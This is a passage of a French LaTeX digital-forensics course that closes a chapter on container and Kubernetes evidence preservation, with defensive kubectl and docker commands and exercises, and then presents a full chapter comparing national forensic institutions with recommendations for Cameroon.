          \textbf{Falco} détectent et alertent en temps réel sur
          les comportements anormaux (exécution de shell inattendue,
          accès fichier sensible), avec capture automatique du
          contexte au moment de l'alerte.
    \item \textbf{Snapshots etcd réguliers}~: préservent l'état
          complet de la configuration du cluster à intervalles
          définis, indépendamment des Pods individuels.
\end{enumerate}
\end{boxPNC}

\subsection{Procédure d'urgence~: les 5 premières minutes}

\begin{boxoutils}{Checklist d'urgence -- incident conteneur détecté}
\begin{lstlisting}[language=bash_forensique]
# MINUTE 0-1 : geler la situation
kubectl label pod prod-webapp-3 quarantine=true
    --namespace=production
# Isoler via NetworkPolicy plutot que supprimer immediatement
kubectl annotate pod prod-webapp-3 forensics.io/preserve=true
# (annotation personnalisee pour signaler aux controllers
#  de ne pas recycler ce pod automatiquement, si configure)

# MINUTE 1-3 : capturer l'etat du conteneur
docker diff <container-id>
docker logs <container-id> --timestamps
docker top <container-id> -eo pid,ppid,cmd

# MINUTE 3-5 : exporter et hasher
docker export <container-id> -o /output/evidence.tar
sha256sum /output/evidence.tar

# APRES : analyse approfondie sans pression temporelle,
# en suivant les procedures des Ch. 14 (systeme) et Ch. 15 (reseau)
# sur les donnees exportees
\end{lstlisting}
\end{boxoutils}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Cinq couches d'abstraction}~: Image (persistante,
          analysable comme un firmware) $\to$ Conteneur (secondes
          à jours) $\to$ Pod $\to$ N\oe ud $\to$ Cluster. Chaque
          couche a ses propres données forensiques.

    \item \textbf{\texttt{docker diff} en premier réflexe}~: révèle
          en une commande tous les fichiers ajoutés, modifiés ou
          supprimés par rapport à l'image d'origine immuable
          --- équivalent conteneur du \texttt{\$UsnJrnl}.

    \item \textbf{L'audit log API Server Kubernetes} est la source
          probatoire la plus importante~: contrairement aux Pod logs
          (perdus à la suppression) et aux Events (rétention~1h),
          il peut être externalisé et conservé durablement.

    \item \textbf{L'orchestrateur peut détruire la preuve lui-même}~:
          \textit{eviction}, \textit{auto-scaling}, redémarrage
          automatique sont des fonctionnements normaux qui
          anéantissent l'état d'un conteneur compromis. C'est
          un défi structurel propre au cloud-native.

    \item \textbf{Les secrets supprimés restent dans l'historique
          des couches Docker}~--- parallèle direct avec le wiping
          de fichiers (Ch.~\ref{chap:anti-for}). Utiliser
          \texttt{docker history --no-trunc} et des scanners
          de secrets (trufflehog, gitleaks).

    \item \textbf{La \textit{readiness} prime sur la réactivité}~:
          contrairement aux scénarios précédents, l'éphéméralité
          extrême exige une architecture préventive (externalisation
          des logs, runtime monitoring avec Falco, politiques
          d'\textit{eviction} documentées) mise en place
          \emph{avant} l'incident.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~23.1 --- Identifier les sources \niveaubase}]
Pour chacune des questions suivantes, identifiez la source de
données la plus appropriée (Tableau~23.1 ou~23.2) et la commande
pour l'obtenir~:
\begin{enumerate}[(a)]
    \item Quels fichiers un conteneur a-t-il modifiés par rapport
          à son image d'origine~?
    \item Qui a exécuté une commande \texttt{kubectl exec} sur un
          Pod en production la nuit dernière~?
    \item Un conteneur contient-il des clés API codées en dur,
          même si elles ont été supprimées dans une couche
          ultérieure du Dockerfile~?
    \item Quel processus tournait dans un conteneur juste avant
          sa destruction par l'orchestrateur~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.2 --- Analyse de docker diff \niveaumoyen}]
La commande \texttt{docker diff prod-api-7} sur un conteneur
suspecté compromis donne~:
\begin{lstlisting}[language=bash_forensique]
A /tmp/.hidden/backdoor.py
A /tmp/.hidden/requirements_extra.txt
C /etc/crontab
C /app/config.yaml
D /var/log/app/access.log
D /var/log/app/error.log
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Interprétez chaque ligne~: que signifient A, C, D~?
    \item Quelle hypothèse formulez-vous sur l'objectif de
          l'attaquant à partir de la modification de
          \texttt{/etc/crontab}~? Quelle technique du Ch.~18
          (IoT) cela rappelle-t-il~?
    \item Les fichiers \texttt{access.log} et \texttt{error.log}
          ont été supprimés (D). Cette suppression elle-même
          a-t-elle laissé une trace~? Où la chercheriez-vous~?
    \item Rédigez les 3~premières constatations de votre rapport
          à partir de ce \texttt{docker diff}, en respectant
          la structure du Ch.~\ref{chap:rapport}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.3 --- Incident Kubernetes complet \niveauexpert}]
Une startup camerounaise de paiement mobile (architecture
Kubernetes sur infrastructure cloud) signale une activité suspecte~:
un Pod traitant les transactions a présenté un pic de trafic réseau
sortant anormal pendant 8~minutes avant d'être automatiquement
redémarré par une \textit{liveness probe} ayant échoué. Le Pod
redémarré est ``propre''~--- aucune trace de compromission visible
dans son état actuel.
\begin{enumerate}[(a)]
    \item Le Pod compromis original a disparu. Quelles sources
          de données restent disponibles pour l'investigation~?
          Classez-les par fiabilité et disponibilité probable.
    \item Quelles requêtes \texttt{jq} sur l'audit log API Server
          formuleriez-vous pour reconstituer l'activité sur ce
          Pod dans la fenêtre de~8~minutes~?
    \item L'entreprise n'avait pas externalisé ses Pod logs
          (perdus à la destruction). Quelle recommandation
          architecturale (Section~\ref{sec:strategie-capture})
          auriez-vous formulée \emph{avant} cet incident pour
          éviter cette perte~?
    \item Cette affaire implique des données financières de
          clients camerounais (Mobile Money). Quelles obligations
          de la \loicam{2024/017} (Ch.~\ref{chap:droit-cam})
          s'appliquent à cette startup concernant la notification
          de l'incident~?
    \item Rédigez la Synthèse Exécutive (Niveau~1, Ch.~\ref{chap:rapport})
          de cette investigation, en assumant honnêtement les
          limites probatoires dues à la perte du Pod original.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La forensique cloud-native illustre une tendance
de fond~: l'infrastructure informatique devient de plus en plus
abstraite et éphémère, rendant l'acquisition réactive de plus en
plus difficile. Cette tendance se prolonge dans le chapitre suivant,
qui examine l'impact de l'informatique quantique sur la pérennité
des preuves numériques signées aujourd'hui~--- un horizon où
l'intégrité cryptographique elle-même devra être repensée.
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie5/P05_C24_benchmarking.tex
% Titre    : Benchmarking Mondial des Pratiques Forensiques
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ -- réécriture intégrale
% Source rejetée : 20_benchmarking.tex (squelette source) contenait des
%            classes Python fictives (NISTForensicFramework, scellement
%            "quantique"), des scores numériques inventés sans source
%            (FBI 9.5/10, score CRO global 9.13) et des affirmations
%            non vérifiables ("leapfrogging post-quantique"). Ce contenu
%            techniquement inauthentique a été entièrement écarté et
%            remplacé par une analyse comparative réelle, sourcée et
%            vérifiable, conformément aux principes de fidélité aux
%            sources de ce cours.
% Positionnement : Quatrième chapitre de la Partie V. S'appuie sur
%                  Ch.7 (standards déjà connus : ISO, NIST, ACPO) pour
%                  une analyse comparative institutionnelle -- non plus
%                  les standards techniques eux-mêmes, mais comment les
%                  grandes juridictions ORGANISENT leurs capacités
%                  forensiques, et ce que le Cameroun peut en tirer.
% ============================================================================

\chapter{Benchmarking Mondial des Pratiques Forensiques}
\label{chap:bench}

\epigraph{%
    « L'excellence s'atteint non pas en imitant, mais en comprenant,
    adaptant et dépassant les meilleures pratiques mondiales. »%
}{--- Malcolm Gladwell}

\niveauChapitre{Expert}{%
    Vision globale du cours requise. Ce chapitre suppose la
    maîtrise du Chapitre~\ref{chap:meth-std} (standards ISO/NIST/ACPO)
    et du Chapitre~\ref{chap:norm-glob} (cadre normatif global)~:
    il les replace dans une perspective institutionnelle comparative.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comparer l'organisation institutionnelle de la forensique
          numérique dans plusieurs juridictions de référence.
    \item Identifier les facteurs structurels qui expliquent les
          écarts de maturité forensique entre pays.
    \item Distinguer ce qui est transposable au contexte camerounais
          de ce qui ne l'est pas, et pourquoi.
    \item Analyser le rôle des laboratoires forensiques nationaux
          et des modèles de certification d'experts.
    \item Formuler des recommandations réalistes pour le développement
          de la capacité forensique camerounaise, ancrées dans
          les contraintes réelles du pays.
    \item Adopter une posture critique face aux discours de
          ``rattrapage technologique'' non étayés.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Avertissement méthodologique}
% ============================================================================

Le benchmarking institutionnel international est un exercice délicat~:
les données chiffrées précises sur les capacités forensiques nationales
(budgets, effectifs, taux de résolution) sont rarement publiées par les
agences elles-mêmes, pour des raisons de sécurité opérationnelle.
Ce chapitre s'appuie donc sur des \textbf{informations publiquement
documentées et vérifiables}~: organisation institutionnelle, cadres
juridiques publiés, accréditations professionnelles, standards
adoptés. Il \textbf{évite délibérément} les classements numériques
précis (``score~9.13/10'') qui donneraient une fausse impression
de précision scientifique à des comparaisons par nature qualitatives.

\separateur

% ============================================================================
\section{Cadre d'Analyse Comparative}
\label{sec:cadre-analyse}
% ============================================================================

\subsection{Pourquoi comparer les systèmes nationaux}

L'objectif de ce chapitre n'est pas le classement mais la
\textbf{compréhension structurelle}~: pourquoi certains pays ont-ils
développé des capacités forensiques matures plus tôt~? Quels facteurs
institutionnels expliquent ces différences~? Lesquels sont transposables
au Cameroun, et à quel horizon temporel réaliste~?

\subsection{Dimensions d'analyse}

\begin{tableaucours}{p{3.0cm}p{8.5cm}}{%
    \tableauHeader{Dimension} &
    \tableauHeader{Question posée}
}
\textbf{Cadre légal} & Existe-t-il une loi spécifique à la
    cybercriminalité~? Depuis quand~? A-t-elle été révisée pour
    suivre l'évolution technologique~? \\
\textbf{Organisation institutionnelle} & Y a-t-il un laboratoire
    forensique national centralisé, ou une capacité distribuée~?
    Quel rattachement administratif (police, justice, agence
    indépendante)~? \\
\textbf{Certification professionnelle} & Existe-t-il un cursus de
    certification reconnu pour les experts forensiques~? Qui
    l'administre~? Est-il obligatoire pour témoigner~? \\
\textbf{Coopération internationale} & Le pays est-il partie à des
    conventions internationales (Budapest, Malabo)~? Dispose-t-il
    d'un point de contact 24/7 opérationnel~? \\
\textbf{Recherche et formation} & Existe-t-il des programmes
    universitaires dédiés~? Une production scientifique nationale
    en forensique numérique~? \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.1 --- Dimensions d'analyse comparative}\end{center}

% ============================================================================
\section{États-Unis~: le Modèle de la Spécialisation Fédérale}
\label{sec:benchmark-usa}
% ============================================================================

\subsection{Organisation institutionnelle}

Les États-Unis se distinguent par une architecture fédérale
fragmentée mais hautement spécialisée. Le FBI dispose de
\textbf{Regional Computer Forensics Laboratories} (RCFL),
un réseau de laboratoires régionaux créé en~1999, qui fournit un
support forensique mutualisé aux agences locales, étatiques
et fédérales. Cette mutualisation permet des investissements
en équipement de pointe inaccessibles à une agence locale isolée.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Fraud and Abuse Act} (1986, révisé
    plusieurs fois)~; \textit{Stored Communications Act} (1986)~;
    cf. Ch.~\ref{chap:leg-mond} \\
Certification & \textit{IACIS} (\textit{International Association
    of Computer Investigative Specialists})~: certification CFCE
    reconnue, examen pratique rigoureux \\
Recherche & NIST publie et maintient activement les standards
    (SP~800-86, NIST~CFTT pour la validation d'outils)~; recherche
    académique abondante \\
Limite structurelle & Fragmentation entre 50~États~+ niveau
    fédéral~: hétérogénéité des pratiques locales malgré
    l'excellence des standards fédéraux \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.2 --- États-Unis~: organisation forensique}\end{center}

\subsection{Ce qui explique la maturité américaine}

Trois facteurs structurels, documentés et vérifiables~: (1)~un
investissement public soutenu dans la recherche (NIST) depuis les
années~1990~; (2)~une industrie privée de cybersécurité considérable
qui alimente en outils, en formation et en personnel qualifié les
agences publiques~; (3)~un volume d'affaires si important qu'il a
justifié très tôt la spécialisation et la standardisation.

\begin{boiteRemarque}{Une limite souvent ignorée}
La maturité technique américaine ne se traduit pas uniformément
en qualité de justice~: le nombre de condamnations annulées pour
vices de procédure forensique (\textit{Daubert challenges} sur
la fiabilité méthodologique) reste significatif. La sophistication
technique n'élimine pas le risque d'erreur procédurale~--- elle
le déplace simplement vers des domaines plus subtils.
\end{boiteRemarque}

% ============================================================================
\section{Royaume-Uni~: le Modèle de la Rigueur Procédurale}
\label{sec:benchmark-uk}
% ============================================================================

\subsection{ACPO et l'héritage procédural}

Le Royaume-Uni a développé, via l'\textit{Association of Chief
Police Officers} (ACPO), le cadre procédural le plus influent au
monde en matière de forensique numérique~: les quatre principes
ACPO (Ch.~\ref{chap:meth-std}) sont aujourd'hui cités et adoptés
bien au-delà du Royaume-Uni, y compris dans des pays sans lien
historique avec le système juridique britannique.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Misuse Act}~1990 (l'une des
    premières lois cyber au monde)~; \textit{Investigatory
    Powers Act}~2016 \\
Organisation & \textit{National Crime Agency} (NCA)~--- unité
    nationale dédiée à la cybercriminalité, créée en~2013,
    centralise les capacités sur les affaires complexes \\
Certification & Pas de certification professionnelle unique
    obligatoire~; accréditation des laboratoires via
    \textit{UKAS} (ISO/IEC~17025) \\
Spécificité & Forte culture de la \textbf{transparence procédurale}~:
    le \textit{disclosure} (communication des preuves à la défense)
    est une obligation stricte qui structure toute la pratique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.3 --- Royaume-Uni~: organisation forensique}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO --- Pourquoi le modèle britannique privilégie
$\mathcal{O}$}

Le système accusatoire britannique (\textit{adversarial system}),
avec son obligation stricte de \textit{disclosure}, crée une
pression institutionnelle constante vers la maximisation de
l'opposabilité ($\mathcal{O}$)~: toute faiblesse procédurale sera
exploitée par la défense. Cette pression a directement façonné
les quatre principes ACPO, conçus moins pour optimiser la vitesse
($\mathcal{R}$ à court terme) que pour garantir la solidité
incontestable du dossier.

\cro{$\sim$}{$\uparrow$ via rigueur procédurale}{$\uparrow\uparrow\uparrow$ priorité structurelle}
\end{boxCRO}

% ============================================================================
\section{Allemagne~: le Modèle de l'Intégration Juridique}
\label{sec:benchmark-allemagne}
% ============================================================================

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & Code pénal (\textit{StGB}) intègre les infractions
    cyber depuis 1986 (\S~202a~--- accès illicite, parmi les plus
    anciennes lois cyber d'Europe)~; conformité RGPD stricte
    (Ch.~\ref{chap:leg-mond}) \\
Organisation & \textit{Bundeskriminalamt} (BKA)~--- office fédéral
    de police criminelle, avec une division cybercriminalité
    intégrée à la structure fédérale \\
Spécificité & Tradition juridique \textit{civil law} (contrairement
    au \textit{common law} britannique/américain)~: les standards
    procéduraux sont fixés par le législateur plutôt que par la
    jurisprudence accumulée \\
Protection des données & Application particulièrement stricte des
    principes de minimisation et de proportionnalité~--- héritage
    direct de l'histoire allemande du~XX\textsuperscript{e}~siècle
    et de la méfiance envers la surveillance étatique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.4 --- Allemagne~: organisation forensique}\end{center}

\begin{boiteRemarque}{Une leçon transposable~: la codification précoce}
L'Allemagne illustre qu'un système \textit{civil law} (comme le
système camerounais, héritier du droit français) peut atteindre
une maturité forensique élevée \textbf{sans dépendre d'une
jurisprudence accumulée sur des décennies}~--- à condition que
le cadre légal soit précis, régulièrement mis à jour, et appliqué
avec constance. C'est directement pertinent pour le Cameroun~:
la \loicam{2010/012} et la \loicam{2024/017} (Ch.~\ref{chap:droit-cam})
suivent cette même logique de codification précise plutôt que
d'attente d'une jurisprudence abondante.
\end{boiteRemarque}

% ============================================================================
\section{Singapour~: le Modèle de l'Investissement Ciblé}
\label{sec:benchmark-singapour}
% ============================================================================

\subsection{Un cas d'étude pertinent pour le Cameroun}

Singapour mérite une attention particulière~: comme le Cameroun,
c'est un pays de taille moyenne, sans l'héritage institutionnel
des grandes puissances occidentales, qui a dû construire sa capacité
forensique à partir d'un point de départ comparable.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Misuse Act}~1993 (révisé
    régulièrement, dernière révision majeure~2017)~; \textit{Personal
    Data Protection Act}~2012 \\
Organisation & \textit{Singapore Police Force Cybercrime Command}~;
    coordination étroite avec l'autorité de régulation
    \textit{Cyber Security Agency} (CSA), créée en~2015 \\
Stratégie & Investissement ciblé sur un nombre limité de capacités
    critiques plutôt que tentative de couverture exhaustive
    immédiate~; partenariats publics-privés structurés
    (Interpol Global Complex for Innovation, basé à Singapour) \\
Facteur clé & Décision politique explicite de faire de la
    cybersécurité un axe stratégique national, avec financement
    soutenu sur le long terme \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.5 --- Singapour~: organisation forensique}\end{center}

\begin{boiteRemarque}{Pourquoi ce modèle est pertinent, et pourquoi il
ne se transpose pas automatiquement}
Singapour a construit sa capacité en \textbf{20--25~ans} avec un
PIB par habitant et un niveau de financement public sans commune
mesure avec celui du Cameroun. La leçon transposable n'est pas le
montant des investissements, mais la \textbf{méthode}~: cibler un
nombre restreint de capacités prioritaires (ici~: la lutte contre
la fraude financière, secteur économiquement stratégique pour
Singapour) plutôt que de disperser des ressources limitées sur
l'ensemble du spectre forensique.
\end{boiteRemarque}

% ============================================================================
\section{Afrique~: Panorama Régional}
\label{sec:benchmark-afrique}
% ============================================================================

\subsection{Maturité variable, dynamiques communes}

Le Chapitre~\ref{chap:leg-mond} a déjà présenté les cadres régionaux
africains (CEDEAO, SADC, EAC). Ce chapitre se concentre sur
l'organisation institutionnelle effective de quelques pays de
référence.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Pays} &
    \tableauHeader{Organisation forensique} &
    \tableauHeader{Élément distinctif}
}
\textbf{Afrique du Sud} & \textit{Cybercrimes Act}~2020~;
    laboratoire forensique \textit{SAPS} (police sud-africaine)
    établi de longue date &
    Le système le plus abouti d'Afrique subsaharienne~; coopération
    INTERPOL active de longue date \\
\textbf{Kenya} & \textit{Computer Misuse and Cybercrimes Act}~2018~;
    \textit{National KE-CIRT/CC} (équipe nationale de réponse
    aux incidents) &
    Écosystème fintech (M-Pesa) ayant accéléré le développement
    de capacités anti-fraude spécialisées \\
\textbf{Rwanda} & \textit{Law on Prevention and Punishment of
    Cyber Crimes}~2018~; \textit{National Cyber Security Authority}
    (NCSA) &
    Stratégie nationale de transformation numérique articulée
    explicitement avec le développement des capacités cyber \\
\textbf{Nigéria} & \textit{Cybercrimes Act}~2015~; \textit{EFCC}
    (\textit{Economic and Financial Crimes Commission}) dispose
    d'une unité cyber dédiée &
    Volume d'affaires considérable (fraude en ligne) ayant
    forcé une professionnalisation rapide malgré des ressources
    limitées \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.6 --- Panorama de quatre pays africains de référence}\end{center}

\subsection{Facteurs communs de progression observés}

\begin{enumerate}
    \item \textbf{Un cadre légal codifié précisément}, même récent,
          vaut mieux qu'un cadre ancien mais vague~--- l'Allemagne
          (Section~\ref{sec:benchmark-allemagne}) et le Rwanda
          partagent cette logique malgré des contextes très différents.
    \item \textbf{Un secteur économique moteur} (fintech au Kenya,
          finance en Afrique du Sud) accélère souvent le développement
          de capacités spécialisées plus efficacement qu'une approche
          générale.
    \item \textbf{La coopération régionale} (AFRIPOL, INTERPOL
          régional, Ch.~\ref{chap:norm-glob}) compense partiellement
          les limites de capacité nationale individuelle.
    \item \textbf{La continuité institutionnelle} compte davantage
          que l'ampleur initiale des moyens~: les pays qui ont
          maintenu un effort constant sur~10--15~ans (Rwanda, Kenya)
          montrent une progression plus nette que ceux ayant connu
          des ruptures de financement ou de priorité politique.
\end{enumerate}

% ============================================================================
\section{Synthèse Comparative~: ce qui Varie et Pourquoi}
\label{sec:synthese-comparative}
% ============================================================================

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Juridiction} &
    \tableauHeader{Force distinctive} &
    \tableauHeader{Facteur explicatif principal}
}
USA & Recherche, normalisation, volume &
    Investissement public soutenu (NIST) + industrie privée +
    volume d'affaires \\
UK & Rigueur procédurale (ACPO) &
    Pression structurelle du système accusatoire (\textit{disclosure}) \\
Allemagne & Intégration juridique précoce &
    Codification précise en \textit{civil law}, sans dépendance
    à la jurisprudence \\
Singapour & Efficacité par ciblage &
    Décision politique de long terme~+ ciblage sectoriel
    (finance) \\
Afrique du Sud & Maturité régionale &
    Continuité institutionnelle longue~+ coopération internationale \\
Kenya/Rwanda & Progression rapide récente &
    Secteur moteur (fintech)~/ stratégie numérique nationale
    articulée \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.7 --- Synthèse~: force distinctive et facteur explicatif}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO --- Pourquoi il n'existe pas de modèle universellement
optimal}

Chaque système national reflète un arbitrage CRO façonné par son
contexte juridique et institutionnel propre~--- pas une hiérarchie
objective de qualité.

Le Royaume-Uni privilégie structurellement $\mathcal{O}$ (système
accusatoire). Les États-Unis investissent massivement dans
$\mathcal{R}$ (recherche, normalisation technique). Singapour
optimise l'efficacité globale par ciblage plutôt que par
maximisation d'une dimension unique.

\cro{variable selon contexte}{variable selon priorité nationale}{variable selon système juridique}

\textbf{Conséquence pour le Cameroun~:} la question pertinente
n'est pas ``quel pays imiter'' mais ``quel arbitrage CRO correspond
aux priorités et contraintes camerounaises actuelles~?''
(Section~\ref{sec:recommandations-cameroun}).
\end{boxCRO}

% ============================================================================
\section{Recommandations pour le Cameroun}
\label{sec:recommandations-cameroun}
% ============================================================================

\subsection{Where Cameroun se situe aujourd'hui}

Le Chapitre~\ref{chap:droit-cam} a établi que le Cameroun dispose
d'un cadre légal récent et structuré (\loicam{2010/012},
\loicam{2024/017}) suivant la même logique de codification précise
que l'Allemagne. C'est un atout réel, souvent sous-estimé~: la
qualité du texte légal n'est pas le facteur limitant principal
identifié dans ce cours.

\begin{tableaucours}{p{4.0cm}p{7.5cm}}{%
    \tableauHeader{Atout actuel} &
    \tableauHeader{Élément}
}
Cadre légal codifié & \loicam{2010/012} et \loicam{2024/017}~:
    structure comparable aux textes allemands dans leur logique
    (codification précise plutôt que jurisprudentielle) \\
Coopération régionale & Accès aux mécanismes CEDEAO~/ AFRIPOL~/
    INTERPOL (Ch.~\ref{chap:norm-glob})~--- atout partagé avec
    les pays africains les plus avancés \\
Formation universitaire & Ce cours lui-même illustre l'émergence
    d'une formation structurée de niveau master, condition
    identifiée comme nécessaire dans tous les modèles étudiés \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.8 --- Atouts actuels du Cameroun}\end{center}

\subsection{Recommandations réalistes, ancrées dans les contraintes}

\begin{enumerate}
    \item \textbf{Cibler plutôt que disperser} (leçon de Singapour)~:
          identifier un ou deux domaines économiquement stratégiques
          (fraude Mobile Money, étant donné le poids économique de
          ce secteur au Cameroun) et y concentrer les premiers
          investissements de capacité spécialisée, plutôt que
          chercher une couverture exhaustive immédiate.
    \item \textbf{Maintenir la continuité institutionnelle}
          (leçon du Rwanda/Kenya)~: la progression observée dans
          les pays africains de référence résulte d'un effort
          soutenu sur~10--15~ans, pas de pics d'investissement
          ponctuels.
    \item \textbf{Investir dans la certification professionnelle}~:
          aucun des modèles étudiés n'a atteint une maturité
          forensique sans un système de qualification reconnu
          des experts (IACIS aux USA, UKAS au UK). Le
          Décret~69/DF/544 camerounais (Ch.~\ref{chap:droit-cam})
          est une base~; son application effective et son
          renforcement méritent une attention prioritaire.
    \item \textbf{Exploiter la coopération régionale comme levier},
          pas comme substitut~: la coopération AFRIPOL/CEDEAO
          (Ch.~\ref{chap:norm-glob}) compense des limites de
          capacité nationale, mais ne dispense pas de construire
          une expertise locale minimale et durable.
    \item \textbf{Rester lucide sur les comparaisons}~: le Cameroun
          ne dispose pas du budget de Singapour ni du volume
          d'affaires des États-Unis. Une stratégie réaliste se
          construit à partir des contraintes réelles, pas d'un
          objectif de ``rattrapage'' générique et non quantifié.
\end{enumerate}

\begin{boxalert}
\textbf{Une mise en garde contre les discours non étayés}

Les discours promettant un ``rattrapage rapide'' ou un
``leapfrogging technologique'' généralisé méritent une lecture
critique systématique~: ils s'appuient rarement sur une analyse
des contraintes réelles (budgétaires, humaines, institutionnelles)
et tendent à minimiser le temps nécessaire à la construction de
capacités durables. Les exemples étudiés dans ce chapitre
(Singapour~: 20--25~ans~; Rwanda/Kenya~: progression continue sur
10--15~ans) montrent que la maturité forensique se construit sur
le temps long, par des choix structurels cohérents et maintenus
--- pas par des annonces de rupture technologique.
\end{boxalert}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Aucun modèle national n'est universellement
          optimal}~: chaque système reflète un arbitrage CRO
          façonné par son contexte juridique propre (système
          accusatoire britannique~$\to$ priorité~$\mathcal{O}$~;
          investissement fédéral américain~$\to$ priorité
          $\mathcal{R}$ via la recherche).

    \item \textbf{Le Royaume-Uni} a développé les principes ACPO
          (Ch.~\ref{chap:meth-std}) sous la pression structurelle
          de l'obligation de \textit{disclosure}.

    \item \textbf{L'Allemagne} démontre qu'un système \textit{civil
          law} (comme le Cameroun) peut atteindre une maturité
          élevée par la codification précise, sans dépendre
          d'une jurisprudence accumulée~--- leçon directement
          transposable.

    \item \textbf{Singapour} illustre l'efficacité du ciblage
          sectoriel plutôt que la dispersion sur l'ensemble
          du spectre forensique~--- construit sur~20--25~ans.

    \item \textbf{Le Kenya et le Rwanda} montrent qu'un secteur
          économique moteur (fintech) ou une stratégie numérique
          nationale articulée peuvent accélérer significativement
          le développement de capacités spécialisées, sur une
          continuité de~10--15~ans.

    \item \textbf{Pour le Cameroun}~: le cadre légal
          (\loicam{2010/012}, \loicam{2024/017}) est un atout réel.
          Les recommandations réalistes privilégient le ciblage
          sectoriel (Mobile Money), la continuité institutionnelle,
          le renforcement de la certification professionnelle et
          l'exploitation de la coopération régionale comme levier.

    \item \textbf{Posture critique obligatoire}~: se méfier des
          discours de rattrapage technologique rapide non étayés
          par une analyse réaliste des contraintes et du temps
          nécessaire.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~24.1 --- Identifier les facteurs explicatifs \niveaubase}]
Pour chacun des pays suivants, identifiez (à partir du Tableau~24.7)
le facteur explicatif principal de sa force distinctive, et formulez
une question que vous poseriez pour vérifier si ce facteur est
transposable au Cameroun~:
\begin{enumerate}[(a)]
    \item Royaume-Uni
    \item Allemagne
    \item Singapour
    \item Kenya
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~24.2 --- Analyse critique d'un discours \niveaumoyen}]
Un consultant présente la proposition suivante~: ``Le Cameroun
doit investir massivement dans l'intelligence artificielle
forensique pour combler en~3~ans l'écart avec les pays occidentaux,
en s'appuyant sur l'absence de systèmes legacy qui freinent
l'innovation dans les pays développés.''
\begin{enumerate}[(a)]
    \item Identifiez dans cette proposition les éléments non
          étayés par les analyses de ce chapitre.
    \item Sur la base des exemples étudiés (Singapour, Rwanda,
          Kenya), quel délai réaliste suggéreriez-vous pour des
          progrès significatifs, et pourquoi~?
    \item Reformulez cette proposition de façon plus rigoureuse,
          en vous appuyant sur les recommandations de la
          Section~\ref{sec:recommandations-cameroun}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~24.3 --- Stratégie nationale argumentée \niveauexpert}]
Vous êtes consulté par l'ANTIC pour contribuer à l'élaboration
d'une feuille de route nationale de développement de la capacité
forensique numérique sur 10~ans.
\begin{enumerate}[(a)]
    \item Proposez un secteur prioritaire de ciblage initial
          (sur le modèle de Singapour) en justifiant votre choix
          par des éléments du contexte économique et criminel
          camerounais évoqués dans ce cours (Ch.~\ref{chap:gr-affaires},
          Ch.~\ref{chap:cas-int}).
    \item Identifiez trois éléments institutionnels (parmi ceux
          étudiés dans ce chapitre~: laboratoire centralisé,
          certification professionnelle, coopération régionale,
          formation universitaire) à prioriser dans les
          3~premières années, en justifiant l'ordre choisi.
    \item Appliquez la grille CRO à votre proposition~: quel
          arbitrage $\mathcal{C}$/$\mathcal{R}$/$\mathcal{O}$
          votre stratégie privilégie-t-elle, et est-ce cohérent
          avec les priorités identifiées en (a)~?
    \item Rédigez un paragraphe de mise en garde contre les
          écueils identifiés dans ce chapitre (dispersion des
          ressources, discours non étayés, rupture de continuité)
          à inclure dans votre feuille de route.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Après cette mise en perspective comparative,
le cours se termine par un retour sur les fondements~: comment
synthétiser l'ensemble du parcours suivi depuis le Prologue, et
quelles sont les perspectives d'évolution de la discipline pour
les investigateurs camerounais formés aujourd'hui.
\end{boxinfo}
    
    % ======================================================================
    % PARTIE VI — CRYPTO-FORENSIQUE ET CONTRIBUTIONS ORIGINALES
    % Contributions : Trilemme CRO (ePrint 2025/1348), ZK-NR (ePrint 2025/1138)
    % Niveau : expert — recherche
    % ======================================================================
    \part{Crypto-Forensique et Contributions Originales}
    \label{part:crypto}

        % ============================================================================
% Fichier  : partie6/P06_C25_impact_quantique.tex
% Titre    : Impact du Quantique sur l'Investigation Numérique
